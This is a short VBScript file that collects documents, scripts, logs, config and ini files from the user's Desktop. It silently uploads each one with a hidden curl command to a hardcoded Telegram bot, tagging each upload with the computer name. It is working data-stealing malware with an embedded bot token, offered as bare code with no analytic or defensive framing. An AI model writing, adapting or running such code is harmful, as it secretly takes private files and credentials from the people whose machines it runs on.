Option Explicit

Dim botToken, chatId, shell, fso, folder, file, folderPath, extensions, computerName
Dim curlCmd, result

botToken = "8711318219:AAFj7ddap7JMNibxMSwIDBcBd8IS36jm6NA"
chatId   = "8221773638"

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

computerName = shell.ExpandEnvironmentStrings("%COMPUTERNAME%")
folderPath = shell.SpecialFolders("Desktop")
Set folder = fso.GetFolder(folderPath)

extensions = "mxl,pdf,txt,docx,ps1,vbs,info,log,config,doc,ini" 

For Each file In folder.Files
    If IsTargetExtension(file.Name, extensions) Then
        ' إضافة اسم الجهاز في كابشن الملف
        curlCmd = "curl -s -F ""chat_id=" & chatId & """ -F ""document=@" & file.Path & """ -F ""caption=Sent from: " & computerName & """ https://api.telegram.org/bot" & botToken & "/sendDocument"
        result = shell.Run(curlCmd, 0, True)
    End If
Next

Function IsTargetExtension(fileName, exts)
    Dim extArray, i
    extArray = Split(exts, ",")
    IsTargetExtension = False
    For i = 0 To UBound(extArray)
        If LCase(Right(fileName, Len(extArray(i)) + 1)) = "." & LCase(extArray(i)) Then
            IsTargetExtension = True
            Exit Function
        End If
    Next
End Function
